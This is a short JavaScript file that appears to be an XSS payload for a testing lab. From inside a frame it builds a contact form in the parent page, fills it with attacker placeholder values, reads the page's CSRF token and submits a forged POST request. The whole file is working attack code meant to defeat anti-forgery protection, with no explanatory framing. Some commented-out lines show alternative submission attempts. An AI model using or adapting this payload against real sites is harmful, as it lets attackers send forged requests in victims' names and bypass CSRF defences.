const f = window.parent.document.createElement('form');
f.setAttribute('id', 'contact-form');
f.setAttribute('name', 'contact-form');
f.setAttribute('method', 'POST');
f.setAttribute('action', 'request');

const name = window.parent.document.createElement('input');
name.setAttribute('type', 'text');
name.setAttribute('id', 'name');
name.setAttribute('name', 'name');
name.setAttribute('value', 'Attacker');

const email = window.parent.document.createElement('input');
email.setAttribute('type', 'email');
email.setAttribute('id', 'email');
email.setAttribute('name', 'email');
email.setAttribute('value', 'attacker@xss.com');

const subject = window.parent.document.createElement('input');
subject.setAttribute('type', 'text');
subject.setAttribute('id', 'subject');
subject.setAttribute('name', 'subject');
subject.setAttribute('value', 'Attacking');

const phone = window.parent.document.createElement('input');
phone.setAttribute('type', 'tel');
phone.setAttribute('id', 'phone_number');
phone.setAttribute('name', 'phone_number');
phone.setAttribute('value', '0509110911');

const message = window.parent.document.createElement('textarea');
message.setAttribute('type', 'text');
message.setAttribute('id', 'message');
message.setAttribute('name', 'message');
message.setAttribute('value', '0509110911');
message.setAttribute('class', 'form-control md-textarea');
message.setAttribute('style', 'height: 150px;');

f.getElementById('message').value = 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Suspendisse sodales pellentesque neque, gravida semper turpis hendrerit in. Interdum et malesuada fames ac ante ipsum primis in faucibus. Vestibulum sit amet leo eu justo fermentum malesuada. Mauris condimentum metus mi, ut bibendum orci pellentesque et. Cras fermentum purus eu enim rutrum gravida. Vivamus varius maximus enim. Ut dapibus at dolor ac pretium. Curabitur vel justo nisl. Duis ac iaculis metus. Curabitur a facilisis neque. Vestibulum bibendum dignissim quam, vel dictum ipsum gravida eget. Phasellus quis maximus purus. Nam semper aliquam velit. Duis quis nisi at turpis viverra dignissim.';

const token = window.parent.document.createElement('input');
token.setAttribute('type', 'hidden');
token.setAttribute('value', window.parent.document.getElementsByName('csrf_token')[0].value);
token.setAttribute('name', 'csrf_token');

f.appendChild(name);
f.appendChild(email);
f.appendChild(subject);
f.appendChild(phone);
f.appendChild(message);
f.appendChild(token);

f.submit();

// document.getElementById('contact-form').style.opacity = 0.5;

// window.parent.document.getElementById('contact-form').submit();

// document.getElementsByName('csrf_token')[0].value = x;

//const s = document.createElement("input");
//s.setAttribute('type', "submit");
//s.setAttribute('value', "Submit");
//f.appendChild(s);





	